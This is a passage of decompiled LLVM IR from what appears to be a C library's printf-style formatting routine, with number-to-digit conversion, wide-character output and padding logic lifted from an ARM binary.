  br label %dec_label_pc_14988

dec_label_pc_14988:                               ; preds = %dec_label_pc_14958, %dec_label_pc_14978
  %v0_14998 = phi i32 [ %v0_14cdc, %dec_label_pc_14958 ], [ %v1_14990.pre, %dec_label_pc_14978 ]
  %v0_14994 = phi i32 [ %v3_14964, %dec_label_pc_14958 ], [ %v0_14988.pre, %dec_label_pc_14978 ]
  %v2_14980 = phi i32 [ %v2_143a8, %dec_label_pc_14958 ], [ %v6_14980, %dec_label_pc_14978 ]
  store i32 %v2_14980, i32* %r0.global-to-local, align 4
  %v3_14988 = udiv i32 %v0_14994, 16
  %v1_1498c = urem i32 %v0_14994, 16
  store i32 %v1_1498c, i32* %r2.global-to-local, align 4
  %v4_14990 = mul i32 %v0_14998, 268435456
  %v5_14990 = or i32 %v3_14988, %v4_14990
  store i32 %v5_14990, i32* %r3.global-to-local, align 4
  %v2_14994 = or i32 %v0_14994, %v0_14998
  %v4_14994 = icmp eq i32 %v2_14994, 0
  %v3_14998 = udiv i32 %v0_14998, 16
  store i32 %v3_14998, i32* %r4.global-to-local, align 4
  store i32 %v5_14990, i32* %r5.global-to-local, align 4
  store i32 %v3_14998, i32* %r6.global-to-local, align 4
  store i32 %v2_14980, i32* @r8, align 4
  br i1 %v4_14994, label %dec_label_pc_149ac, label %dec_label_pc_14978

dec_label_pc_149ac:                               ; preds = %dec_label_pc_14988
  %v2_149b0 = load i8, i8* %stack_var_-64, align 1
  %v3_149b0 = sext i8 %v2_149b0 to i32
  store i32 %v0_14cdc, i32* %r3.global-to-local, align 4
  %v2_149b4 = or i32 %v3_149b0, %v0_14cdc
  store i32 %v2_149b4, i32* @r2, align 4
  %v4_149b4 = icmp eq i32 %v2_149b4, 0
  br i1 %v4_149b4, label %dec_label_pc_14a34, label %dec_label_pc_149bc

dec_label_pc_149bc:                               ; preds = %dec_label_pc_149ac
  %v4_149bc = sext i8 %stack_var_-712.3 to i32
  store i32 %v4_149bc, i32* %r0.global-to-local, align 4
  %v1_149c0 = and i32 %v4_149bc, 8
  store i32 %v1_149c0, i32* @r2, align 4
  %v2_149c0 = icmp eq i32 %v1_149c0, 0
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* %r1.global-to-local, align 4
  br i1 %v2_149c0, label %dec_label_pc_14a34, label %.thread51

.thread51:                                        ; preds = %dec_label_pc_149bc
  store i32 %v4_14958, i32* @r2, align 4
  %v5_149d0 = sdiv i32 %v4_14958, 16
  %v6_149d0 = add i32 %v5_149d0, ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32)
  store i32 %v6_149d0, i32* @sb, align 4
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_14ae0

dec_label_pc_149e0:                               ; preds = %bb547
  store i32 %v2_143a0, i32* %r0.global-to-local, align 4
  %v2_149e8 = load i8, i8* %stack_var_-64, align 1
  %v3_149e8 = sext i8 %v2_149e8 to i32
  store i32 %v3_149e8, i32* %r5.global-to-local, align 4
  store i32 %v0_14cdc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_149fc

dec_label_pc_149f4:                               ; preds = %dec_label_pc_149fc
  %v1_149f4 = trunc i32 %v1_14a00 to i8
  %v3_149f4 = add i32 %v0_14a4c, -1
  %v4_149f4 = inttoptr i32 %v3_149f4 to i8*
  store i8 %v1_149f4, i8* %v4_149f4, align 1
  %v5_149f4 = load i32, i32* @r8, align 4
  %v6_149f4 = add i32 %v5_149f4, -1
  store i32 %v6_149f4, i32* %r8.global-to-local, align 4
  %v0_149fc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14a08.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149e0, %dec_label_pc_149f4
  %v0_14a10 = phi i32 [ %v0_14cdc, %dec_label_pc_149e0 ], [ %v1_14a08.pre, %dec_label_pc_149f4 ]
  %v0_14a0c = phi i32 [ %v3_149e8, %dec_label_pc_149e0 ], [ %v0_149fc.pre, %dec_label_pc_149f4 ]
  %v0_14a4c = phi i32 [ %v2_143a8, %dec_label_pc_149e0 ], [ %v6_149f4, %dec_label_pc_149f4 ]
  store i32 %v0_14a4c, i32* %r0.global-to-local, align 4
  %v1_149fc = urem i32 %v0_14a0c, 8
  %v1_14a00 = or i32 %v1_149fc, 48
  store i32 %v1_14a00, i32* %ip.global-to-local, align 4
  %v3_14a04 = udiv i32 %v0_14a0c, 8
  %v4_14a08 = mul i32 %v0_14a10, 536870912
  %v5_14a08 = or i32 %v3_14a04, %v4_14a08
  store i32 %v5_14a08, i32* %r3.global-to-local, align 4
  %v2_14a0c = or i32 %v0_14a0c, %v0_14a10
  store i32 %v2_14a0c, i32* @lr, align 4
  %v4_14a0c = icmp eq i32 %v2_14a0c, 0
  %v3_14a10 = udiv i32 %v0_14a10, 8
  store i32 %v3_14a10, i32* %r4.global-to-local, align 4
  store i32 %v5_14a08, i32* %r5.global-to-local, align 4
  store i32 %v3_14a10, i32* %r6.global-to-local, align 4
  store i32 %v0_14a4c, i32* @r8, align 4
  br i1 %v4_14a0c, label %dec_label_pc_14a24, label %dec_label_pc_149f4

dec_label_pc_14a24:                               ; preds = %dec_label_pc_149fc
  store i32 %v4_14790, i32* %r3.global-to-local, align 4
  %v1_14a28 = and i32 %v4_14790, 8
  store i32 %v1_14a28, i32* @r2, align 4
  %v2_14a28 = icmp eq i32 %v1_14a28, 0
  br i1 %v2_14a28, label %dec_label_pc_14a34, label %dec_label_pc_14a3c

dec_label_pc_14a34:                               ; preds = %dec_label_pc_149ac, %dec_label_pc_14a24, %dec_label_pc_149bc
  %v0_14b48281 = phi i32 [ %v2_14980, %dec_label_pc_149bc ], [ %v2_14980, %dec_label_pc_149ac ], [ %v0_14a4c, %dec_label_pc_14a24 ]
  %stack_var_-708.8 = phi i8* [ %stack_var_-708.6, %dec_label_pc_149bc ], [ %stack_var_-708.6, %dec_label_pc_149ac ], [ %stack_var_-708.5, %dec_label_pc_14a24 ]
  %stack_var_-712.5 = phi i8 [ %stack_var_-712.3, %dec_label_pc_149bc ], [ %stack_var_-712.3, %dec_label_pc_149ac ], [ %stack_var_-712.1, %dec_label_pc_14a24 ]
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_14ae0

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_14a24
  %v4_14a40 = ptrtoint i8* %stack_var_-708.5 to i32
  store i32 %v4_14a40, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* %r1.global-to-local, align 4
  %v2_14a4c = sub i32 %v3_14b44, %v0_14a4c
  store i32 %v2_14a4c, i32* %r3.global-to-local, align 4
  %v2_14a50 = sub i32 %v4_14a40, %v2_14a4c
  %v4_14a50 = xor i32 %v2_14a4c, %v4_14a40
  %v5_14a50 = xor i32 %v2_14a50, %v4_14a40
  %v6_14a50 = and i32 %v5_14a50, %v4_14a50
  %v7_14a50 = icmp slt i32 %v6_14a50, 0
  %v8_14a50 = icmp slt i32 %v2_14a50, 0
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  %v2_14a5c = xor i1 %v8_14a50, %v7_14a50
  %v8_14a5c = inttoptr i32 %v2_14a4c to i8*
  %v8_14a5c.stack_var_-708.5 = select i1 %v2_14a5c, i8* %v8_14a5c, i8* %stack_var_-708.5
  br label %dec_label_pc_14ae0

dec_label_pc_14a64:                               ; preds = %bb547, %bb547
  %v2_14a68 = load i8, i8* %stack_var_-64, align 1
  %v3_14a68 = sext i8 %v2_14a68 to i32
  store i32 %v3_14a68, i32* %r3.global-to-local, align 4
  store i32 %v0_14cdc, i32* @r4, align 4
  %v1_14a6c = icmp slt i32 %v0_14cdc, 0
  br i1 %v1_14a6c, label %dec_label_pc_14a74, label %dec_label_pc_14a90

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a64
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  %v1_14a78 = sub nsw i32 0, %v3_14a68
  store i32 %v1_14a78, i32* %r3.global-to-local, align 4
  %v2_14a78 = icmp eq i8 %v2_14a68, 0
  %v2_14a7c = icmp eq i1 %v2_14a78, false
  %v5_14a7c = sext i1 %v2_14a7c to i32
  %v6_14a7c = sub i32 %v5_14a7c, %v0_14cdc
  store i32 %v6_14a7c, i32* @r4, align 4
  store i32 1, i32* @sl, align 4
  %v5_14a84 = trunc i32 %v1_14a78 to i8
  store i8 %v5_14a84, i8* %stack_var_-64, align 1
  br label %bb552

dec_label_pc_14a90:                               ; preds = %dec_label_pc_14a64
  store i32 %v4_14790, i32* @lr, align 4
  %v1_14a94 = and i32 %v4_14790, 2048
  %v2_14a94 = icmp eq i32 %v1_14a94, 0
  br i1 %v2_14a94, label %dec_label_pc_14aa4, label %.thread53

.thread53:                                        ; preds = %dec_label_pc_14a90
  store i32 ptrtoint ([9 x i8]* @global_var_19ed9.691 to i32), i32* @sb, align 4
  store i32 1, i32* @sl, align 4
  br label %bb552

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a90
  store i32 %v4_14790, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* %r3.global-to-local, align 4
  %v1_14aac = urem i32 %v4_14790, 2
  store i32 %v1_14aac, i32* %r1.global-to-local, align 4
  %v2_14ab0 = icmp eq i32 %v1_14aac, 0
  store i32 ptrtoint ([8 x i8]* @global_var_19eda.692 to i32), i32* %r2.global-to-local, align 4
  br i1 %v2_14ab0, label %bb551, label %.thread59

bb551:                                            ; preds = %dec_label_pc_14aa4
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  store i32 0, i32* @sl, align 4
  br label %bb552

.thread59:                                        ; preds = %dec_label_pc_14aa4
  store i32 ptrtoint ([8 x i8]* @global_var_19eda.692 to i32), i32* @sb, align 4
  store i32 1, i32* @sl, align 4
  br label %bb552

bb552:                                            ; preds = %bb551, %.thread53, %dec_label_pc_14a74, %dec_label_pc_14894, %.thread59
  %stack_var_-60.3 = phi i32 [ %v0_14cdc, %dec_label_pc_14894 ], [ %v6_14a7c, %dec_label_pc_14a74 ], [ %v0_14cdc, %bb551 ], [ %v0_14cdc, %.thread59 ], [ %v0_14cdc, %.thread53 ]
  %v2_14ad0 = load i8, i8* %stack_var_-64, align 1
  %v3_14ad0 = sext i8 %v2_14ad0 to i32
  store i32 %v3_14ad0, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-60.3, i32* %r1.global-to-local, align 4
  store i32 %v2_143a8, i32* %r2.global-to-local, align 4
  %v3_14ad8 = call i32 @fmt_u(i32 %v3_14ad0, i32 %stack_var_-60.3, i32 %v2_143a8)
  store i32 %v3_14ad8, i32* %r0.global-to-local, align 4
  store i32 %v3_14ad8, i32* @r8, align 4
  br label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %dec_label_pc_14a3c, %.thread51, %dec_label_pc_14a34, %bb552
  %v0_14b48280 = phi i32 [ %v3_14ad8, %bb552 ], [ %v0_14b48281, %dec_label_pc_14a34 ], [ %v2_14980, %.thread51 ], [ %v0_14a4c, %dec_label_pc_14a3c ]
  %v1_14b34 = phi i32 [ %stack_var_-60.3, %bb552 ], [ %v0_14cdc, %dec_label_pc_14a34 ], [ %v0_14cdc, %.thread51 ], [ %v0_14cdc, %dec_label_pc_14a3c ]
  %stack_var_-708.9 = phi i8* [ %stack_var_-708.5, %bb552 ], [ %stack_var_-708.8, %dec_label_pc_14a34 ], [ %stack_var_-708.6, %.thread51 ], [ %v8_14a5c.stack_var_-708.5, %dec_label_pc_14a3c ]
  %stack_var_-712.6 = phi i8 [ %stack_var_-712.1, %bb552 ], [ %stack_var_-712.5, %dec_label_pc_14a34 ], [ %stack_var_-712.3, %.thread51 ], [ %stack_var_-712.1, %dec_label_pc_14a3c ]
  %v4_14ae0 = ptrtoint i8* %stack_var_-708.9 to i32
  store i32 %v4_14ae0, i32* %r1.global-to-local, align 4
  %v1_14ae4 = icmp slt i8* %stack_var_-708.9, null
  %v2_14ae4 = icmp eq i8* %stack_var_-708.9, null
  br i1 %v1_14ae4, label %._crit_edge275, label %bb553

._crit_edge275:                                   ; preds = %dec_label_pc_14ae0
  %v2_14af0437 = load i8, i8* %stack_var_-64, align 1
  %v3_14af0438 = sext i8 %v2_14af0437 to i32
  store i32 %v3_14af0438, i32* %r0.global-to-local, align 4
  store i32 %v1_14b34, i32* %r1.global-to-local, align 4
  %v3_14af8.pre = load i32, i32* @r2, align 4
  %extract.t468 = trunc i32 %v3_14af8.pre to i8
  br label %bb554

bb553:                                            ; preds = %dec_label_pc_14ae0
  %v7_14ae8 = sext i8 %stack_var_-712.6 to i32
  %v2_14af0 = load i8, i8* %stack_var_-64, align 1
  %v3_14af0 = sext i8 %v2_14af0 to i32
  store i32 %v3_14af0, i32* %r0.global-to-local, align 4
  store i32 %v1_14b34, i32* %r1.global-to-local, align 4
  %v4_14af4 = and i32 %v7_14ae8, -65537
  store i32 %v4_14af4, i32* %r2.global-to-local, align 4
  br label %bb554

bb554:                                            ; preds = %._crit_edge275, %bb553
  %v3_14af8.pre.sink.off0 = phi i8 [ %extract.t468, %._crit_edge275 ], [ %stack_var_-712.6, %bb553 ]
  %v3_14af0439 = phi i32 [ %v3_14af0438, %._crit_edge275 ], [ %v3_14af0, %bb553 ]
  %stack_var_-712.7 = select i1 %v1_14ae4, i8 %stack_var_-712.6, i8 %v3_14af8.pre.sink.off0
  store i32 %v4_14ae0, i32* %ip.global-to-local, align 4
  %v2_14b00 = or i32 %v3_14af0439, %v1_14b34
  %v4_14b00 = icmp eq i32 %v2_14b00, 0
  %. = zext i1 %v4_14b00 to i32
  %.. = select i1 %v2_14ae4, i32 %., i32 0
  store i32 %.., i32* %r3.global-to-local, align 4
  %v2_14b1c = icmp eq i32 %.., 0
  store i32 %v2_14b20, i32* %r2.global-to-local, align 4
  br i1 %v2_14b1c, label %dec_label_pc_14b30, label %.thread61

.thread61:                                        ; preds = %bb554
  store i32 %v2_143a8, i32* @r8, align 4
  store i32 %v2_143a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_14b30:                               ; preds = %bb554
  store i32 %v2_143a8, i32* %r2.global-to-local, align 4
  store i32 %v4_14ae0, i32* @lr, align 4
  %v3_14b44.v2_143a8 = select i1 %v4_14b00, i32 %v3_14b44, i32 %v2_143a8
  %v2_14b48 = sub i32 %v3_14b44.v2_143a8, %v0_14b48280
  store i32 %v2_14b48, i32* %r3.global-to-local, align 4
  %v2_14b4c = sub i32 %v4_14ae0, %v2_14b48
  %v4_14b4c = xor i32 %v2_14b48, %v4_14ae0
  %v5_14b4c = xor i32 %v2_14b4c, %v4_14ae0
  %v6_14b4c = and i32 %v5_14b4c, %v4_14b4c
  %v7_14b4c = icmp slt i32 %v6_14b4c, 0
  %v8_14b4c = icmp slt i32 %v2_14b4c, 0
  %v2_14b50 = xor i1 %v8_14b4c, %v7_14b4c
  br i1 %v2_14b50, label %bb559, label %bb560

bb559:                                            ; preds = %dec_label_pc_14b30
  store i32 %v2_14b48, i32* @lr, align 4
  br label %bb560

bb560:                                            ; preds = %dec_label_pc_14b30, %bb559
  %v0_14b58 = phi i32 [ %v4_14ae0, %dec_label_pc_14b30 ], [ %v2_14b48, %bb559 ]
  store i32 %v2_143a8, i32* %r0.global-to-local, align 4
  %v5_14b58 = inttoptr i32 %v0_14b58 to i8*
  br label %dec_label_pc_15ba8

dec_label_pc_14b60:                               ; preds = %bb547
  store i32 %v2_14b74, i32* @r8, align 4
  store i32 %v2_143a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  %v3_14b80 = load i8, i8* %stack_var_-64, align 1
  %v4_14b80 = sext i8 %v3_14b80 to i32
  store i32 %v4_14b80, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  store i32 %v4_14b80, i32* %stack_var_-107, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_14b98:                               ; preds = %bb547
  %v0_14b98 = call i32 @__errno_location()
  store i32 %v0_14b98, i32* %r0.global-to-local, align 4
  %v1_14b9c = inttoptr i32 %v0_14b98 to i32*
  %v2_14b9c = load i32, i32* %v1_14b9c, align 4
  store i32 %v2_14b9c, i32* %r0.global-to-local, align 4
  %v1_14ba0 = call i32 @strerror(i32 %v2_14b9c)
  store i32 %v1_14ba0, i32* %r0.global-to-local, align 4
  store i32 %v1_14ba0, i32* @r8, align 4
  br label %bb562

dec_label_pc_14bac:                               ; preds = %bb547
  %v3_14bac = load i8, i8* %stack_var_-64, align 1
  %v4_14bac = sext i8 %v3_14bac to i32
  store i32 %v4_14bac, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19ee4.694 to i32), i32* %r3.global-to-local, align 4
  %v2_14bb4 = icmp eq i8 %v3_14bac, 0
  br i1 %v2_14bb4, label %.thread64, label %bb561

bb561:                                            ; preds = %dec_label_pc_14bac
  store i32 %v4_14bac, i32* @r8, align 4
  br label %bb562

.thread64:                                        ; preds = %dec_label_pc_14bac
  store i32 ptrtoint ([7 x i8]* @global_var_19ee4.694 to i32), i32* @r8, align 4
  br label %bb562

bb562:                                            ; preds = %bb561, %dec_label_pc_14b98, %.thread64
  %v0_14bc4 = phi i32 [ %v1_14ba0, %dec_label_pc_14b98 ], [ %v4_14bac, %bb561 ], [ ptrtoint ([7 x i8]* @global_var_19ee4.694 to i32), %.thread64 ]
  %v4_14bc0 = ptrtoint i8* %stack_var_-708.5 to i32
  store i32 %v4_14bc0, i32* %r2.global-to-local, align 4
  %v1_14bc4 = inttoptr i32 %v0_14bc4 to i8*
  store i32 %v0_14bc4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v5_14bcc = call i32 @memchr(i8* %v1_14bc4, i32 0, i32 %v4_14bc0)
  store i32 %v5_14bcc, i32* %r0.global-to-local, align 4
  %v2_14bd0 = icmp eq i32 %v5_14bcc, 0
  store i32 %v4_14790, i32* %ip.global-to-local, align 4
  br i1 %v2_14bd0, label %bb563, label %.thread65

.thread65:                                        ; preds = %bb562
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  %v1_14be0 = load i32, i32* @r8, align 4
  %v3_14be0 = sub i32 %v5_14bcc, %v1_14be0
  store i32 %v3_14be0, i32* %r3.global-to-local, align 4
  %v1_14be4 = and i32 %v4_14790, -65537
  store i32 %v1_14be4, i32* %ip.global-to-local, align 4
  br label %bb564

bb563:                                            ; preds = %bb562
  store i32 %v4_14bc0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  %v1_14be468 = and i32 %v4_14790, -65537
  store i32 %v1_14be468, i32* %ip.global-to-local, align 4
  %v1_14be8.pre = load i32, i32* @r8, align 4
  %v1_14bec.pre.pre = load i32, i32* @r3, align 4
  %v3_14be8 = add i32 %v1_14be8.pre, %v4_14bc0
  store i32 %v3_14be8, i32* %r0.global-to-local, align 4
  br label %bb564

bb564:                                            ; preds = %.thread65, %bb563
  %v0_15bac.pre409 = phi i32 [ %v1_14be0, %.thread65 ], [ %v1_14be8.pre, %bb563 ]
  %v1_15bac390 = phi i32 [ %v5_14bcc, %.thread65 ], [ %v3_14be8, %bb563 ]
  %v1_14bec = phi i32 [ %v3_14be0, %.thread65 ], [ %v1_14bec.pre.pre, %bb563 ]
  %v6_14bec = inttoptr i32 %v1_14bec to i8*
  %stack_var_-708.10 = select i1 %v2_14bd0, i8* %stack_var_-708.5, i8* %v6_14bec
  br label %dec_label_pc_15ba4

dec_label_pc_14bf8:                               ; preds = %bb547
  %v3_14bf8 = load i8, i8* %stack_var_-64, align 1
  store i8 %v3_14bf8, i8* %stack_var_-72, align 1
  store i32 -1, i32* @lr, align 4
  store i32 %v2_143ac, i32* %r3.global-to-local, align 4
  store i8 %v6_143cc, i8* %stack_var_-64, align 1
  br label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %bb547, %dec_label_pc_14bf8
  %stack_var_-708.11 = phi i8* [ %stack_var_-708.5, %bb547 ], [ inttoptr (i32 -1 to i8*), %dec_label_pc_14bf8 ]
  store i32 0, i32* @r4, align 4
  %v3_14c1c = load i8, i8* %stack_var_-64, align 1
  %v4_14c1c = sext i8 %v3_14c1c to i32
  store i32 %v4_14c1c, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v4_14c30 = ptrtoint i8* %stack_var_-708.11 to i32
  store i32 %v4_14c30, i32* %r1.global-to-local, align 4
  %v3_14c34692 = icmp eq i8* %stack_var_-708.11, null
  store i32 %v2_14c24, i32* %r0.global-to-local, align 4
  br i1 %v3_14c34692, label %dec_label_pc_15d00, label %dec_label_pc_14c40

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c68
  %v2_14c2c = add i32 %v0_14c60, %v2_14c54
  store i32 %v2_14c2c, i32* @r4, align 4
  store i32 %v4_14c30, i32* %r1.global-to-local, align 4
  %v3_14c34 = icmp ult i32 %v2_14c2c, %v4_14c30
  store i32 %v2_14c24, i32* %r0.global-to-local, align 4
  br i1 %v3_14c34, label %dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge, label %dec_label_pc_15d00

dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge:  ; preds = %dec_label_pc_14c2c
  %v0_14c40.pre = load i32, i32* @r5, align 4
  %v1_14c40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c18, %dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge
  %v1_14c40 = phi i32 [ %v1_14c40.pre, %dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge ], [ %v4_14c1c, %dec_label_pc_14c18 ]
  %v0_14c40 = phi i32 [ %v0_14c40.pre, %dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge ], [ 0, %dec_label_pc_14c18 ]
  %v0_14c34699 = phi i32 [ %v2_14c2c, %dec_label_pc_14c2c.dec_label_pc_14c40_crit_edge ], [ 0, %dec_label_pc_14c18 ]
  %v2_14c40 = add i32 %v1_14c40, %v0_14c40
  %v3_14c40 = inttoptr i32 %v2_14c40 to i32*
  %v4_14c40 = load i32, i32* %v3_14c40, align 4
  store i32 %v4_14c40, i32* %r3.global-to-local, align 4
  %v2_14c44 = icmp eq i32 %v4_14c40, 0
  store i32 %v4_14c40, i32* %r1.global-to-local, align 4
  %v1_14c4c = add i32 %v0_14c40, 4
  store i32 %v1_14c4c, i32* @r5, align 4
  br i1 %v2_14c44, label %dec_label_pc_15d00, label %dec_label_pc_14c54

dec_label_pc_14c54:                               ; preds = %dec_label_pc_14c40
  %v2_14c54 = call i32 @wctomb(i32 %v2_14c24, i32 %v4_14c40)
  store i32 %v2_14c54, i32* %r0.global-to-local, align 4
  store i32 %v4_14c30, i32* %r2.global-to-local, align 4
  %v1_14c5c = icmp slt i32 %v2_14c54, 0
  %v0_14c60 = load i32, i32* @r4, align 4
  %v2_14c60 = sub i32 %v4_14c30, %v0_14c60
  store i32 %v2_14c60, i32* %r3.global-to-local, align 4
  br i1 %v1_14c5c, label %dec_label_pc_15ce8, label %dec_label_pc_14c68

dec_label_pc_14c68:                               ; preds = %dec_label_pc_14c54
  %tmp894 = icmp ugt i32 %v2_14c54, %v2_14c60
  br i1 %tmp894, label %dec_label_pc_15d00, label %dec_label_pc_14c2c

dec_label_pc_14c74:                               ; preds = %dec_label_pc_14c90
  %v2_14c74 = call i32 @out(i32* %v1_15bf0)
  %v0_14c78.pre = load i32, i32* @r6, align 4
  %v1_14c78 = load i32, i32* @r4, align 4
  %v3_14c78 = icmp ult i32 %v0_14c78.pre, %v1_14c78
  store i32 %v2_14c24, i32* %r0.global-to-local, align 4
  br i1 %v3_14c78, label %dec_label_pc_14c74.dec_label_pc_14c84_crit_edge, label %dec_label_pc_14cb4

dec_label_pc_14c74.dec_label_pc_14c84_crit_edge:  ; preds = %dec_label_pc_14c74
  %v0_14c84.pre = load i32, i32* @r7, align 4
  %v1_14c84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14c84

dec_label_pc_14c84:                               ; preds = %dec_label_pc_15d00, %dec_label_pc_14c74.dec_label_pc_14c84_crit_edge
  %v1_14c84 = phi i32 [ %v1_14c84.pre, %dec_label_pc_14c74.dec_label_pc_14c84_crit_edge ], [ %v4_15d20, %dec_label_pc_15d00 ]
  %v0_14c84 = phi i32 [ %v0_14c84.pre, %dec_label_pc_14c74.dec_label_pc_14c84_crit_edge ], [ 0, %dec_label_pc_15d00 ]
  %v1_14c78712 = phi i32 [ %v1_14c78, %dec_label_pc_14c74.dec_label_pc_14c84_crit_edge ], [ %v1_14c78703, %dec_label_pc_15d00 ]
  %v2_14c84 = add i32 %v1_14c84, %v0_14c84
  %v3_14c84 = inttoptr i32 %v2_14c84 to i32*
  %v4_14c84 = load i32, i32* %v3_14c84, align 4
  store i32 %v4_14c84, i32* %r3.global-to-local, align 4
  store i32 %v4_14c84, i32* %r1.global-to-local, align 4
  %v2_14c88 = icmp eq i32 %v4_14c84, 0
  br i1 %v2_14c88, label %dec_label_pc_14cb4, label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14c84
  %v2_14c90 = call i32 @wctomb(i32 %v2_14c24, i32 %v4_14c84)
  store i32 %v2_14c90, i32* %r3.global-to-local, align 4
  %v0_14c98 = load i32, i32* @r6, align 4
  %v2_14c98 = add i32 %v0_14c98, %v2_14c90
  store i32 %v2_14c98, i32* @r6, align 4
  %v1_14c9c = load i32, i32* @r4, align 4
  store i32 %v2_14c90, i32* @r2, align 4
  store i32 %v2_14c24, i32* @r1, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v0_14cac = load i32, i32* @r7, align 4
  %v1_14cac = add i32 %v0_14cac, 4
  store i32 %v1_14cac, i32* @r7, align 4
  %v7_14cb0 = icmp sgt i32 %v2_14c98, %v1_14c9c
  br i1 %v7_14cb0, label %dec_label_pc_14cb4, label %dec_label_pc_14c74

dec_label_pc_14cb4:                               ; preds = %dec_label_pc_14c74, %dec_label_pc_14c84, %dec_label_pc_14c90, %dec_label_pc_15d00
  %v0_15120386 = phi i32 [ 0, %dec_label_pc_15d00 ], [ %v1_14c9c, %dec_label_pc_14c90 ], [ %v1_14c78712, %dec_label_pc_14c84 ], [ %v1_14c78, %dec_label_pc_14c74 ]
  store i32 %v4_14790, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15114

dec_label_pc_14cc0:                               ; preds = %bb547, %bb547, %bb547, %bb547, %bb547, %bb547, %bb547, %bb547
  %v2_14cc4 = load i8, i8* %stack_var_-64, align 1
  %v3_14cc4 = sext i8 %v2_14cc4 to i32
  store i32 %v3_14cc4, i32* @r5, align 4
  store i32 %v0_14cdc, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %tmp895 = icmp slt i32 %v0_14cdc, 0
  %v3_14ccc = zext i1 %tmp895 to i32
  store i32 %v3_14ccc, i32* %r3.global-to-local, align 4
  %v9_14cd0 = icmp eq i1 %tmp895, false
  store i8 0, i8* %stack_var_-52, align 1
  br i1 %v9_14cd0, label %dec_label_pc_14cf8, label %dec_label_pc_14cdc

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14cc0
  %v1_14cdc = sub i32 0, %v0_14cdc
  store i32 %v1_14cdc, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_19eec.696 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  store i32 %v1_14cdc, i32* @r6, align 4
  br label %dec_label_pc_14d38

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cc0
  store i32 %v4_14790, i32* %r0.global-to-local, align 4
  %v1_14cfc = and i32 %v4_14790, 2048
  %v2_14cfc = icmp eq i32 %v1_14cfc, 0
  br i1 %v2_14cfc, label %dec_label_pc_14d14, label %.thread69

.thread69:                                        ; preds = %dec_label_pc_14cf8
  store i32 ptrtoint ([16 x i8]* @global_var_19eef.698 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d38

dec_label_pc_14d14:                               ; preds = %dec_label_pc_14cf8
  store i32 %v4_14790, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([18 x i8]* @global_var_19eed.700 to i32), i32* %r3.global-to-local, align 4
  %v1_14d1c = urem i32 %v4_14790, 2
  store i32 %v1_14d1c, i32* %r1.global-to-local, align 4
  %v2_14d20 = icmp eq i32 %v1_14d1c, 0
  store i32 ptrtoint ([13 x i8]* @global_var_19ef2.701 to i32), i32* %r2.global-to-local, align 4
  br i1 %v2_14d20, label %.thread76, label %bb565

bb565:                                            ; preds = %dec_label_pc_14d14
  store i32 ptrtoint ([13 x i8]* @global_var_19ef2.701 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %.thread76

.thread76:                                        ; preds = %dec_label_pc_14d14, %bb565
  %v0_14d34 = phi i32 [ 0, %dec_label_pc_14d14 ], [ 1, %bb565 ]
  %v0_14d30 = phi i32 [ ptrtoint ([18 x i8]* @global_var_19eed.700 to i32), %dec_label_pc_14d14 ], [ ptrtoint ([13 x i8]* @global_var_19ef2.701 to i32), %bb565 ]
